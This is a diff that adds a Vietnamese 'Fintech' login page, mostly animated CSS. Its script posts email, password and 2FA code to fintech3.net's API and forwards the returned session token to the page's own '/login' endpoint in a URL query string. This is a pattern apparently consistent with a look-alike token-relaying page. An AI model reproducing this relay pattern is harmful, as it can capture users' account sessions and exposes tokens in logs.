@@ -1,0 +1,755 @@
+<!doctype html>
+<html lang="vi">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Đăng nhập vào Tài khoản của bạn — Fintech</title>
+<style>
+  :root{
+    --bg:#0b1320; --card:#0f2138; --text:#f5f9ff; --muted:#9aa3ab;
+    --blue:#2563eb; --blue-2:#1e4bd1; --line:#1d334f; --radius:14px;
+    --accent:#2dd4bf; --success:#34c759; --warning:#ff8c42; --error:#ff6b6b;
+  }
+  
+  *{box-sizing:border-box}
+  
+  body{
+    margin:0;
+    background: linear-gradient(135deg, #0b1320 0%, #1a2332 50%, #0f1b2b 100%);
+    background-attachment: fixed;
+    color:var(--text);
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial;
+    min-height:100vh;
+    position: relative;
+    overflow-x: hidden;
+  }
+  
+  /* Advanced 3D animated background with multiple layers */
+  body::before {
+    content: '';
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background-image: 
+      radial-gradient(circle at 20% 80%, rgba(45, 212, 191, 0.15) 0%, transparent 60%),
+      radial-gradient(circle at 80% 20%, rgba(37, 99, 235, 0.12) 0%, transparent 60%),
+      radial-gradient(circle at 40% 40%, rgba(255, 140, 66, 0.08) 0%, transparent 60%),
+      radial-gradient(circle at 10% 10%, rgba(138, 43, 226, 0.06) 0%, transparent 60%),
+      radial-gradient(circle at 90% 90%, rgba(255, 77, 79, 0.04) 0%, transparent 60%);
+    animation: floatingBg3D 32s ease-in-out infinite;
+    pointer-events: none;
+    z-index: 0;
+  }
+  
+  @keyframes floatingBg3D {
+    0%, 100% { 
+      transform: translateY(0px) translateX(0px) rotate(0deg) scale(1);
+      filter: blur(0px) hue-rotate(0deg) brightness(1);
+    }
+    20% { 
+      transform: translateY(-28px) translateX(15px) rotate(2.5deg) scale(1.08);
+      filter: blur(0.8px) hue-rotate(72deg) brightness(1.15);
+    }
+    40% { 
+      transform: translateY(20px) translateX(-22px) rotate(-1.8deg) scale(0.92);
+      filter: blur(1.5px) hue-rotate(144deg) brightness(0.85);
+    }
+    60% { 
+      transform: translateY(-15px) translateX(18px) rotate(1.5deg) scale(1.05);
+      filter: blur(0.6px) hue-rotate(216deg) brightness(1.1);
+    }
+    80% { 
+      transform: translateY(12px) translateX(-10px) rotate(-1deg) scale(0.96);
+      filter: blur(0.4px) hue-rotate(288deg) brightness(0.9);
+    }
+  }
+
+  /* Floating 3D geometric shapes */
+  body::after {
+    content: '';
+    position: fixed;
+    top: 15%;
+    right: 8%;
+    width: 180px;
+    height: 180px;
+    background: conic-gradient(from 60deg, 
+      rgba(45, 212, 191, 0.3), 
+      rgba(37, 99, 235, 0.2), 
+      rgba(255, 140, 66, 0.15), 
+      rgba(138, 43, 226, 0.25), 
+      rgba(255, 77, 79, 0.1),
+      rgba(45, 212, 191, 0.3));
+    border-radius: 40% 60% 75% 25% / 30% 50% 70% 50%;
+    animation: morphingShape3D 35s ease-in-out infinite;
+    pointer-events: none;
+    z-index: 0;
+  }
+
+  @keyframes morphingShape3D {
+    0%, 100% { 
+      border-radius: 40% 60% 75% 25% / 30% 50% 70% 50%;
+      transform: rotate(0deg) scale(1) rotateX(0deg) rotateY(0deg);
+      opacity: 0.8;
+      filter: blur(0px);
+    }
+    16% { 
+      border-radius: 65% 35% 85% 15% / 85% 55% 45% 15%;
+      transform: rotate(60deg) scale(1.4) rotateX(20deg) rotateY(15deg);
+      opacity: 1;
+      filter: blur(1.2px);
+    }
+    32% { 
+      border-radius: 50% 50% 35% 65% / 35% 75% 25% 65%;
+      transform: rotate(120deg) scale(0.6) rotateX(-15deg) rotateY(25deg);
+      opacity: 0.4;
+      filter: blur(2.5px);
+    }
+    48% { 
+      border-radius: 75% 25% 55% 45% / 65% 35% 65% 35%;
+      transform: rotate(180deg) scale(1.2) rotateX(25deg) rotateY(-20deg);
+      opacity: 0.9;
+      filter: blur(0.8px);
+    }
+    64% { 
+      border-radius: 30% 70% 50% 50% / 80% 20% 80% 20%;
+      transform: rotate(240deg) scale(0.8) rotateX(-10deg) rotateY(10deg);
+      opacity: 0.6;
+      filter: blur(1.8px);
+    }
+    80% { 
+      border-radius: 55% 45% 70% 30% / 45% 65% 35% 55%;
+      transform: rotate(300deg) scale(1.1) rotateX(10deg) rotateY(-5deg);
+      opacity: 0.7;
+      filter: blur(1px);
+    }
+  }
+  
+  .wrap{
+    max-width:560px;
+    margin:6vh auto 40px;
+    padding:0 18px;
+    position: relative;
+    z-index: 1;
+  }
+  
+  .card{
+    background: rgba(15, 33, 56, 0.95);
+    backdrop-filter: blur(20px);
+    border: 1px solid rgba(45, 212, 191, 0.2);
+    border-radius:24px;
+    padding:32px 28px;
+    box-shadow: 
+      0 25px 80px rgba(0,0,0,.6),
+      0 0 0 1px rgba(255,255,255,.05),
+      inset 0 1px 0 rgba(255,255,255,.1);
+    position: relative;
+    overflow: hidden;
+    animation: cardSlideIn 0.8s cubic-bezier(0.4, 0, 0.2, 1);
+    transform-origin: center;
+  }
+  
+  @keyframes cardSlideIn {
+    0% {
+      opacity: 0;
+      transform: translateY(30px) scale(0.95);
+    }
+    100% {
+      opacity: 1;
+      transform: translateY(0) scale(1);
+    }
+  }
+  
+  .card::before {
+    content: '';
+    position: absolute;
+    top: 0;
+    left: -100%;
+    width: 100%;
+    height: 100%;
+    background: linear-gradient(90deg, transparent, rgba(45, 212, 191, 0.1), transparent);
+    animation: shimmer 3s infinite;
+  }
+  
+  @keyframes shimmer {
+    0% { left: -100%; }
+    100% { left: 100%; }
+  }
+  
+  .brand{
+    display:flex;
+    align-items:center;
+    gap:12px;
+    margin-bottom:16px;
+    justify-content: center;
+    animation: brandFadeIn 1s ease-out 0.3s both;
+  }
+  
+  @keyframes brandFadeIn {
+    0% {
+      opacity: 0;
+      transform: translateY(-10px);
+    }
+    100% {
+      opacity: 1;
+      transform: translateY(0);
+    }
+  }
+  
+  .brand img{
+    height:36px;
+    width:auto;
+    filter: drop-shadow(0 4px 8px rgba(45, 212, 191, 0.3));
+    transition: all 0.3s ease;
+  }
+  
+  .brand img:hover {
+    transform: scale(1.05);
+    filter: drop-shadow(0 6px 12px rgba(45, 212, 191, 0.5));
+  }
+  
+  .title{
+    font-size:24px;
+    font-weight:800;
+    margin:16px 0 24px;
+    text-align: center;
+    background: linear-gradient(135deg, #f5f9ff, #2dd4bf);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+    animation: titleSlideIn 1s ease-out 0.5s both;
+  }
+  
+  @keyframes titleSlideIn {
+    0% {
+      opacity: 0;
+      transform: translateX(-20px);
+    }
+    100% {
+      opacity: 1;
+      transform: translateX(0);
+    }
+  }
+  
+  label{
+    display:block;
+    font-size:13px;
+    color:var(--muted);
+    margin:16px 0 8px;
+    font-weight: 600;
+    transition: color 0.3s ease;
+  }
+  
+  .field{
+    position:relative;
+    margin-bottom: 4px;
+  }
+  
+  .field:focus-within label {
+    color: var(--accent);
+  }
+  
+  input{
+    width:100%;
+    height:52px;
+    border-radius:16px;
+    border:2px solid var(--line);
+    background: rgba(10, 27, 46, 0.8);
+    color:#fff;
+    font-size:16px;
+    padding:0 50px 0 16px;
+    outline:none;
+    transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+    backdrop-filter: blur(10px);
+  }
+  
+  input:focus {
+    border-color: var(--accent);
+    background: rgba(10, 27, 46, 0.95);
+    box-shadow: 
+      0 0 0 4px rgba(45, 212, 191, 0.1),
+      0 8px 25px rgba(45, 212, 191, 0.15);
+    transform: translateY(-2px);
+  }
+  
+  input::placeholder{
+    color:#7692b0;
+    transition: opacity 0.3s ease;
+  }
+  
+  input:focus::placeholder {
+    opacity: 0.7;
+  }
+  
+  .toggle-eye{
+    position:absolute;
+    right:16px;
+    top:50%;
+    transform:translateY(-50%);
+    background:transparent;
+    border:0;
+    color:#b6c2cf;
+    cursor:pointer;
+    font-size:13px;
+    font-weight: 600;
+    padding: 8px;
+    border-radius: 8px;
+    transition: all 0.3s ease;
+  }
+  
+  .toggle-eye:hover {
+    background: rgba(45, 212, 191, 0.1);
+    color: var(--accent);
+    transform: translateY(-50%) scale(1.05);
+  }
+  
+  button.primary{
+    width:100%;
+    height:56px;
+    border-radius:16px;
+    border:0;
+    background: linear-gradient(135deg, var(--blue), var(--accent));
+    color:#fff;
+    font-size:17px;
+    font-weight:800;
+    cursor:pointer;
+    margin-top:20px;
+    position: relative;
+    overflow: hidden;
+    transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+    box-shadow: 0 8px 25px rgba(37, 99, 235, 0.3);
+  }
+  
+  button.primary::before {
+    content: '';
+    position: absolute;
+    top: 0;
+    left: -100%;
+    width: 100%;
+    height: 100%;
+    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+    transition: left 0.5s;
+  }
+  
+  button.primary:hover {
+    transform: translateY(-3px);
+    box-shadow: 0 12px 35px rgba(37, 99, 235, 0.4);
+  }
+  
+  button.primary:hover::before {
+    left: 100%;
+  }
+  
+  button.primary:active {
+    transform: translateY(-1px);
+  }
+  
+  button.primary:disabled{
+    opacity:.6;
+    cursor:not-allowed;
+    transform: none;
+    box-shadow: 0 4px 15px rgba(37, 99, 235, 0.2);
+  }
+  
+  .links{
+    display:flex;
+    justify-content:space-between;
+    gap:14px;
+    margin:16px 0 0;
+  }
+  
+  .links a{
+    color:#8ab4ff;
+    text-decoration:none;
+    font-weight: 500;
+    transition: all 0.3s ease;
+    position: relative;
+  }
+  
+  .links a::after {
+    content: '';
+    position: absolute;
+    bottom: -2px;
+    left: 0;
+    width: 0;
+    height: 2px;
+    background: var(--accent);
+    transition: width 0.3s ease;
+  }
+  
+  .links a:hover {
+    color: var(--accent);
+    transform: translateY(-1px);
+  }
+  
+  .links a:hover::after {
+    width: 100%;
+  }
+  
+  .divider{
+    height:1px;
+    background: linear-gradient(90deg, transparent, #10263e, transparent);
+    margin:20px 0;
+    position: relative;
+  }
+  
+  .divider::after {
+    content: '';
+    position: absolute;
+    top: -1px;
+    left: 50%;
+    transform: translateX(-50%);
+    width: 60px;
+    height: 3px;
+    background: linear-gradient(90deg, var(--accent), var(--blue));
+    border-radius: 2px;
+  }
+  
+  .below{
+    display:flex;
+    flex-wrap:wrap;
+    gap:8px 18px;
+    align-items:center;
+    justify-content:center;
+    color:#dbe7ff;
+    font-size:14px;
+    text-align: center;
+    animation: belowFadeIn 1s ease-out 0.8s both;
+  }
+  
+  @keyframes belowFadeIn {
+    0% {
+      opacity: 0;
+      transform: translateY(10px);
+    }
+    100% {
+      opacity: 1;
+      transform: translateY(0);
+    }
+  }
+  
+  .below a{
+    color:#8ab4ff;
+    text-decoration:none;
+    font-weight: 600;
+    transition: all 0.3s ease;
+  }
+  
+  .below a:hover{
+    color: var(--accent);
+    transform: translateY(-1px);
+  }
+  
+  .msg{
+    min-height:24px;
+    margin-top:12px;
+    font-size:14px;
+    font-weight: 600;
+    text-align: center;
+    padding: 8px 12px;
+    border-radius: 12px;
+    transition: all 0.3s ease;
+  }
+  
+  .msg:not(:empty) {
+    background: rgba(45, 212, 191, 0.1);
+    border: 1px solid rgba(45, 212, 191, 0.2);
+    animation: messageSlideIn 0.3s ease-out;
+  }
+  
+  @keyframes messageSlideIn {
+    0% {
+      opacity: 0;
+      transform: translateY(-10px) scale(0.95);
+    }
+    100% {
+      opacity: 1;
+      transform: translateY(0) scale(1);
+    }
+  }
+  
+  /* 2FA Section */
+  #twofa-wrap {
+    animation: twofaSlideIn 0.4s ease-out;
+    transform-origin: top;
+  }
+  
+  @keyframes twofaSlideIn {
+    0% {
+      opacity: 0;
+      transform: scaleY(0);
+    }
+    100% {
+      opacity: 1;
+      transform: scaleY(1);
+    }
+  }
+  
+  /* Loading state */
+  .loading {
+    position: relative;
+  }
+  
+  .loading::after {
+    content: '';
+    position: absolute;
+    top: 50%;
+    right: 16px;
+    transform: translateY(-50%);
+    width: 20px;
+    height: 20px;
+    border: 2px solid rgba(255,255,255,0.3);
+    border-top: 2px solid #fff;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+  }
+  
+  @keyframes spin {
+    0% { transform: translateY(-50%) rotate(0deg); }
+    100% { transform: translateY(-50%) rotate(360deg); }
+  }
+  
+  /* Responsive */
+  @media (max-width: 480px) {
+    .wrap {
+      margin: 4vh auto 20px;
+      padding: 0 16px;
+    }
+    
+    .card {
+      padding: 24px 20px;
+      border-radius: 20px;
+    }
+    
+    .title {
+      font-size: 22px;
+    }
+    
+    input {
+      height: 48px;
+      font-size: 16px;
+    }
+    
+    button.primary {
+      height: 52px;
+      font-size: 16px;
+    }
+  }
+  
+  /* Success/Error states */
+  .msg[style*="color:#34c759"], .msg[style*="color: #34c759"] {
+    background: rgba(52, 199, 89, 0.1) !important;
+    border-color: rgba(52, 199, 89, 0.3) !important;
+    color: #34c759 !important;
+  }
+  
+  .msg[style*="color:#ff6b6b"], .msg[style*="color: #ff6b6b"] {
+    background: rgba(255, 107, 107, 0.1) !important;
+    border-color: rgba(255, 107, 107, 0.3) !important;
+    color: #ff6b6b !important;
+  }
+  
+  .msg[style*="color:#ffd166"], .msg[style*="color: #ffd166"] {
+    background: rgba(255, 209, 102, 0.1) !important;
+    border-color: rgba(255, 209, 102, 0.3) !important;
+    color: #ffd166 !important;
+  }
+</style>
+</head>
+<body>
+  <div class="wrap">
+    <div class="card">
+      <div class="brand">
+        <img src="https://fintech3.net/static/media/logo.8490529fc9b2fd89a0ad.png" alt="Fintech logo" />
+      </div>
+      <div class="title">Đăng nhập vào Tài khoản của bạn</div>
+
+      <label for="email">Địa chỉ Email *</label>
+      <div class="field">
+        <input id="email" type="email" placeholder="Điền Email..." autocomplete="username" inputmode="email" required>
+      </div>
+
+      <label for="password">Mật khẩu *</label>
+      <div class="field">
+        <input id="password" type="password" placeholder="Điền mật khẩu..." autocomplete="current-password" required>
+        <button class="toggle-eye" type="button" id="togglePwd">Hiện</button>
+      </div>
+
+      <div id="twofa-wrap" style="display:none">
+        <label for="twofa">Mã 2FA (Google Authenticator)</label>
+        <div class="field">
+          <input id="twofa" type="text" placeholder="123456" inputmode="numeric" autocomplete="one-time-code" maxlength="6" pattern="[0-9]*">
+        </div>
+      </div>
+
+      <div class="links">
+        <a href="https://fintech3.net/forgot-password" rel="noopener">Quên mật khẩu</a>
+        <span></span>
+      </div>
+
+      <button id="btn-login" class="primary">Đăng nhập</button>
+      <div id="msg" class="msg"></div>
+
+      <div class="divider"></div>
+      <div class="below">
+        <span>Cần tài khoản Fintech?</span>
+        <a href="https://fintech3.net/reg" rel="noopener">Đăng ký</a>
+        <span>Không nhận được email xác nhận?</span>
+        <a href="https://fintech3.net/forgot-password" rel="noopener">Yêu cầu một email mới</a>
+      </div>
+    </div>
+  </div>
+
+<script>
+(() => {
+  const API = 'https://fintech3.net/api/user';
+  const $ = id => document.getElementById(id);
+  const emailEl = $('email'), passEl = $('password'), twofaWrap = $('twofa-wrap'), twofaEl = $('twofa');
+  const btn = $('btn-login'), msg = $('msg'), togglePwd = $('togglePwd');
+
+  const setMsg = (t, color='#fff') => { 
+    msg.style.color=color; 
+    msg.textContent=t||''; 
+    if (t) {
+      msg.style.animation = 'none';
+      msg.offsetHeight; // trigger reflow
+      msg.style.animation = 'messageSlideIn 0.3s ease-out';
+    }
+  };
+  
+  const setLoading = (v) => {
+    btn.disabled = v;
+    btn.textContent = v ? 'Đang xử lý…' : 'Đăng nhập';
+    btn.classList.toggle('loading', v);
+    [emailEl, passEl, twofaEl].forEach(x => x && (x.disabled = v));
+  };
+  
+  const isEmailLike = (s) => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(s);
+
+  // Đã có token thì vào thẳng trang chính
+  (async () => {
+    try {
+      const tk = localStorage.getItem('token');
+      if (tk) {
+        await fetch('/login?token=' + encodeURIComponent(tk));
+        location.replace('/');
+      }
+    } catch (e) {}
+  })();
+
+  // Toggle show/hide password
+  togglePwd.addEventListener('click', () => {
+    const t = passEl.type === 'password' ? 'text' : 'password';
+    passEl.type = t;
+    togglePwd.textContent = t === 'password' ? 'Hiện' : 'Ẩn';
+  });
+
+  // Helper fetch với timeout
+  const fetchJSON = async (url, {method='POST', body, headers} = {}) => {
+    const ctrl = new AbortController();
+    const to = setTimeout(() => ctrl.abort(), 12000);
+    try {
+      const r = await fetch(url, {
+        method,
+        headers: { 'Content-Type': 'application/json', 'Accept': 'application/json', ...(headers||{}) },
+        body: body ? JSON.stringify(body) : undefined,
+        signal: ctrl.signal
+      });
+      let j = {};
+      try { j = await r.json(); } catch {}
+      return { r, j };
+    } finally { clearTimeout(to); }
+  };
+
+  const normalizeAndStore = (payload) => {
+    try {
+      const data = payload?.data ?? payload ?? {};
+      let token = data.token || data.accessToken || payload?.token;
+      if (typeof token === 'string') token = token.replace(/^Bearer\s+/i,'');
+      if (token) localStorage.setItem('token', token);
+      if (data.refreshToken) localStorage.setItem('refreshToken', data.refreshToken);
+      localStorage.setItem('user', JSON.stringify(data));
+    } catch {}
+  };
+
+  function saveAndGo(payload) {
+    normalizeAndStore(payload);
+    setMsg('Đăng nhập thành công. Đang chuyển…', '#34c759');
+    const data = payload?.data ?? payload ?? {};
+    let token = data.token || data.accessToken || payload?.token;
+    if (typeof token === 'string') token = token.replace(/^Bearer\s+/i,'');
+    if (token) {
+      fetch('/login?token=' + encodeURIComponent(token))
+        .then(() => location.replace('/'));
+    } else {
+      location.replace('/');
+    }
+  }
+
+  const need2FA = (r, j) => {
+    if (r.status === 400 && typeof j?.message === 'string' && j.message.toLowerCase().includes('verify 2fa')) return true;
+    if (j?.twofa === 1 || j?.twofaRequired === true) return true;
+    return false;
+  };
+
+  const show2FA = (hint='Tài khoản yêu cầu 2FA. Nhập mã OTP để tiếp tục.') => {
+    twofaWrap.style.display = 'block';
+    setMsg(hint, '#ffd166');
+    twofaEl?.focus();
+  };
+
+  const tryCheck2FA = async (email, password) => {
+    let res = await fetchJSON(`${API}/checkuser2fa`, { body: { email, password } });
+    if (res.r.status === 404 || res.r.status === 405) {
+      res = await fetchJSON(`${API}/checkuser2fa`, { body: { email } });
+    }
+    return res;
+  };
+
+  const loginWithoutOtp = async (email, password) => {
+    const { r, j } = await fetchJSON(`${API}/login`, { body: { email, password } });
+    if (need2FA(r, j)) { show2FA('Tài khoản đã bật 2FA. Vui lòng nhập mã 6 số từ Google Authenticator.'); return { twofa:true }; }
+    if (r.ok && (j?.status === true || j?.data?.token || j?.token)) { saveAndGo(j); return { ok:true }; }
+    const m = j?.message || j?.error || (r.status === 401 ? 'Sai email hoặc mật khẩu.' : 'Đăng nhập thất bại.');
+    throw new Error(m);
+  };
+
+  btn.addEventListener('click', async () => {
+    const email = emailEl.value.trim();
+    const password = passEl.value.trim();
+    const otp = twofaWrap.style.display !== 'none' ? (twofaEl.value.trim().replace(/\s+/g,'') || '') : '';
+
+    if (!email) return setMsg('Vui lòng nhập email.', '#ff6b6b');
+    if (!isEmailLike(email)) return setMsg('Email không hợp lệ.', '#ff6b6b');
+    if (!password) return setMsg('Vui lòng nhập mật khẩu.', '#ff6b6b');
+
+    setLoading(true); setMsg('Đang xử lý...');
+
+    try {
+      if (twofaWrap.style.display === 'none') {
+        try {
+          const { r, j } = await tryCheck2FA(email, password);
+          if (need2FA(r, j)) { show2FA(); setLoading(false); return; }
+        } catch {}
+        const res = await loginWithoutOtp(email, password);
+        if (res?.ok || res?.twofa) return;
+      } else {
+        if (!/^\d{4,10}$/.test(otp)) { setMsg('Mã 2FA không hợp lệ.', '#ff6b6b'); setLoading(false); return; }
+        const { r, j } = await fetchJSON(`${API}/login`, { body: { email, password, otp } });
+        if (r.ok && (j?.status === true || j?.data?.token || j?.token)) { saveAndGo(j); return; }
+        if (r.status === 400 || r.status === 401) throw new Error(j?.message || 'OTP sai hoặc hết hạn.');
+        throw new Error(j?.message || j?.error || 'Đăng nhập thất bại.');
+      }
+    } catch (err) {
+      setMsg(String(err?.message || err) || 'Có lỗi xảy ra.', '#ff6b6b');
+      setLoading(false);
+    }
+  });
+
+  document.addEventListener('keydown', (e) => { if (e.key === 'Enter' && !btn.disabled) btn.click(); });
+  twofaEl?.addEventListener('input', () => { twofaEl.value = twofaEl.value.replace(/\D+/g,'').slice(0,6); });
+})();
+</script>
+</body>
+</html>
